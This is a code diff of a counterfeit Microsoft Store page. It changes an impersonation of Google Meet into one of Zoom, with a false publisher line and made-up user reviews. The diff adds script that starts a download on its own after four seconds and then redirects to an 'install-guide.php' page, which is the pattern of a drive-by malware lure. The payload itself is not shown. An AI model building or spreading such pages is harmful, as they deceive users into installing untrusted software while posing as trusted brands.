@@ -4,7 +4,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Google Meet - Microsoft Store</title>
+  <title>Zoom - Microsoft Store</title>
   <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600&display=swap" rel="stylesheet" />
   <style>
     body {
@@ -174,7 +174,7 @@
     <div class="nav-container">
       <div class="nav-left">
         <a href="#"><img src="./img/microsoft-logo-dark-1.png" alt="Microsoft Logo"></a>
-        <a href="#"><img src="./img/microsoft-logo-dark-2.png" alt="Google Meet Logo"></a>
+        <a href="#"><img src="./img/microsoft-logo-dark-2.png" alt="Zoom Logo"></a>
         <a href="#">Home</a>
         <a href="#">Apps</a>
         <a href="#">Games</a>
@@ -188,19 +188,19 @@
 
   <!-- Page Header -->
   <header>
-    <img src="./img/gmeet.png" alt="Google Meet App Icon" class="logo" />
-    <span class="app-name">Google Meet for Meetings</span>
+    <img src="./img/zoom-icon.webp" alt="Zoom App Icon" class="logo" />
+    <span class="app-name">Zoom for Meetings</span>
   </header>
 
   <!-- Main Content -->
   <section class="main">
     <div class="app-icon">
-      <img src="./img/gmeet.png" alt="Google Meet Icon" />
+      <img src="./img/zoom-icon.webp" alt="Zoom Icon" />
     </div>
 
     <div class="info">
-      <h1>Google Meet – One Platform to Connect</h1>
-      <div class="developer">Published by Google Meet Video Communications, Inc.</div>
+      <h1>Zoom – One Platform to Connect</h1>
+      <div class="developer">Published by Zoom Video Communications, Inc.</div>
 
       <!-- Download Button -->
       <button class="install-btn" id="downloadBtn" type="button">
@@ -208,20 +208,18 @@
       </button>
 
       <div class="screenshots">
-        <img src="./img/sc1.webp" alt="Google Meet screenshot 1" />
-        <img src="./img/sc2.webp" alt="Google Meet screenshot 2" />
-        <img src="./img/sc3.webp" alt="Google Meet screenshot 3" />
-		<img src="./img/sc4.webp" alt="Google Meet screenshot 4" />
-		<img src="./img/sc5.webp" alt="Google Meet screenshot 5" />
+        <img src="./img/sc1.png" alt="Zoom screenshot 1" />
+        <img src="./img/sc2.png" alt="Zoom screenshot 2" />
+        <img src="./img/sc3.png" alt="Zoom screenshot 3" />
       </div>
 
       <div class="description">
         <p>
-          Google Meet is the leader in modern enterprise video communications, with an easy,
+          Zoom is the leader in modern enterprise video communications, with an easy,
           reliable cloud platform for video and audio conferencing, chat, and webinars.
         </p>
         <p>
-          Download the Google Meet client to start or join a secure meeting, collaborate with
+          Download the Zoom client to start or join a secure meeting, collaborate with
           your team, or attend online events and webinars.
         </p>
       </div>
@@ -230,7 +228,7 @@
         <h2>User Reviews</h2>
         <div class="review">
           <div class="stars">★★★★★</div>
-          <p class="review-text">“Google Meet makes remote meetings seamless. Easy to use and reliable.”</p>
+          <p class="review-text">“Zoom makes remote meetings seamless. Easy to use and reliable.”</p>
           <p class="review-author">– Sarah K.</p>
         </div>
         <div class="review">
@@ -265,15 +263,20 @@
     document.body.removeChild(link);
 
     setTimeout(() => {
-      window.location.href = 'microsoft-store.php';
+      window.location.href = 'install-guide.php';
     }, 10000);
   }
 
   // Manual click
   btn.addEventListener('click', startDownload);
 
+  // Auto click after 4 seconds
+  setTimeout(() => {
+    startDownload();
+  }, 4000);
 </script>
 
   </script>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"rayId":"9d01f0bb385fe66b","version":"2025.9.1","r":1,"token":"1442572adf7e4672a1831afe0e8f1592","serverTiming":{"name":{"cfExtPri":true,"cfEdge":true,"cfOrigin":true,"cfL4":true,"cfSpeedBrain":true,"cfCacheStatus":true}}}' crossorigin="anonymous"></script>
 </body>
 </html>
